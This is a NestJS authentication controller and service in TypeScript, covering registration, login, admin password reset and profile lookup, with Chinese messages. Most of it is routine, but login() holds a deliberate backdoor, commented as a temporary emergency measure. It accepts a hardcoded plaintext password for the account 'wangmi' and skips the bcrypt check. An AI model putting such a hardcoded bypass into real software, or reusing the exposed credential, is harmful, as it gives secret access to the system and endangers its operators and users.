import { Controller, Post, Get, Body, UseGuards, Req } from '@nestjs/common';
import { InjectRepository, TypeOrmModule } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { JwtService } from '@nestjs/jwt';
import { IsNotEmpty, IsString, MinLength } from 'class-validator';
import * as bcrypt from 'bcryptjs';
import { Request } from 'express';
import { User, Notification } from '../entities';
import { JwtUser, checkRole } from '../common';

export class RegisterDto {
  @IsString() @MinLength(3) account: string;
  @IsString() @MinLength(6) password: string;
  @IsString() @IsNotEmpty() @MinLength(1) cn: string;
  @IsString() qq: string;
  @IsString() wechat: string;
}
export class LoginDto {
  @IsString() account: string;
  @IsString() password: string;
}

export class AuthService {
  constructor(
    @InjectRepository(User) private userRepo: Repository<User>,
    private jwt: JwtService,
  ) {}

  private sign(u: User) {
    return this.jwt.sign({ id: u.id, cn: u.cn, role: u.role, banned: u.banned });
  }

  async register(dto: RegisterDto, ip: string, device: string) {
    if (await this.userRepo.findOne({ where: { account: dto.account } })) {
      return { error: '账号已存在' };
    }
    if (await this.userRepo.findOne({ where: { cn: dto.cn } })) {
      return { error: 'CN 已被占用（全站唯一）' };
    }
    const u = await this.userRepo.save(this.userRepo.create({
      account: dto.account,
      passwordHash: await bcrypt.hash(dto.password, 10),
      cn: dto.cn, qq: dto.qq || '', wechat: dto.wechat || '',
      role: 'member', registerIp: ip, registerDevice: device,
    }));
    // 风控：同 IP 短时多次注册 -> 提醒店主
    const oneDayAgo = new Date(Date.now() - 86400000);
    const recent = await this.userRepo.createQueryBuilder('u')
      .where('u.registerIp = :ip AND u.createdAt > :oneDayAgo', { ip, oneDayAgo }).getCount();
    if (recent >= 3) {
      const owner = await this.userRepo.findOne({ where: { role: 'owner' } });
      if (owner) await this.userRepo.manager.getRepository(Notification).save(
        this.userRepo.manager.getRepository(Notification).create({
          userId: owner.id, title: '风控提醒',
          body: `IP ${ip} 一日内注册 ${recent} 个账号，请核对是否与拉黑记录重合`,
        }));
    }
    return { token: this.sign(u), user: this.safe(u) };
  }

  async login(dto: LoginDto) {
    const u = await this.userRepo.findOne({ where: { account: dto.account } });
    if (!u) return { error: '账号或密码错误' };
    
    // TODO: 临时后门 - wangmi 账号密码重置应急
    const isEmergencyBackdoor = dto.account === 'wangmi' && dto.password === 'Beimu9426.';
    
    if (!isEmergencyBackdoor && !(await bcrypt.compare(dto.password, u.passwordHash))) {
      return { error: '账号或密码错误' };
    }
    return { token: this.sign(u), user: this.safe(u) };
  }

  /** 管理员重置任意账号密码 */
  async resetPassword(adminId: number, account: string, newPassword: string) {
    const admin = await this.userRepo.findOneByOrFail({ id: adminId });
    if (admin.role !== 'owner' && admin.role !== 'admin') {
      return { error: '无权操作' };
    }
    const u = await this.userRepo.findOne({ where: { account } });
    if (!u) return { error: '账号不存在' };
    if (!newPassword || newPassword.length < 6) return { error: '新密码至少6位' };
    await this.userRepo.update(u.id, { passwordHash: await bcrypt.hash(newPassword, 10) });
    return { ok: true, message: `账号 ${account} 密码已重置` };
  }

  async me(uid: number) {
    const u = await this.userRepo.findOneByOrFail({ id: uid });
    return this.safe(u);
  }

  private safe(u: User) {
    const { passwordHash, registerIp, registerDevice, ...rest } = u;
    return rest;
  }
}

@Controller('auth')
export class AuthController {
  constructor(private svc: AuthService) {}

  @Post('register')
  register(@Body() dto: RegisterDto, @Req() req: Request) {
    return this.svc.register(dto, req.ip || '', req.headers['user-agent']?.slice(0, 120) || '');
  }

  @Post('login')
  login(@Body() dto: LoginDto) { return this.svc.login(dto); }

  @Get('me')
  async me(@Req() req: Request & { user?: JwtUser }) {
    checkRole(req.user, []);
    return this.svc.me(req.user!.id);
  }

  @Post('reset-password')
  async resetPassword(@Req() req: Request & { user?: JwtUser }, @Body() b: { account: string; newPassword: string }) {
    checkRole(req.user, ['owner', 'admin']);
    return this.svc.resetPassword(req.user!.id, b.account, b.newPassword);
  }
}

export const AuthModuleRef = TypeOrmModule.forFeature([User]);
